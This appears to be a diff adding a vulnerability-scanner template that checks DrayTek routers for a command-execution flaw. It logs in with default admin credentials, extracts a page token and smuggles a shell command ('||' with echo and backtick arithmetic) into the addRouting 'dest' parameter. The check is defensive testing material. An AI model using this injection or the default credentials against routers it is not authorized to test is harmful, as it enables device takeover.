@@ -1,0 +1,48 @@
+id: draytek-addrouting-rce
+info:
+  name: DrayTek Router addrouting Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  t1: "{{rand_int(1000, 9999)}}"
+  t2: "{{rand_int(100, 1000)}}"
+  t3: "{{to_number(t1) - to_number(t2)}}"
+
+http:
+  - id: token-extraction
+    method: GET
+    path:
+      - "{{BaseURL}}/opmode.asp"
+    headers:
+      Authorization: Basic YWRtaW46YWRtaW4=
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        part: body
+        regex:
+          - "<input type=\"hidden\" value=(?P<token>.*?) name="
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: exploit-verification
+    method: GET
+    path:
+      - "{{BaseURL}}/goform/addRouting?AuthStr={{token}}&dest=||+echo+\"This+website+has+a+vulnerability+`expr+{{t1}}+-+{{t2}}`\"%3b%23a"
+    headers:
+      Authorization: Basic YWRtaW46YWRtaW4=
+      Referer: "{{BaseURL}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t3}}"
+          - "This website has a vulnerability"
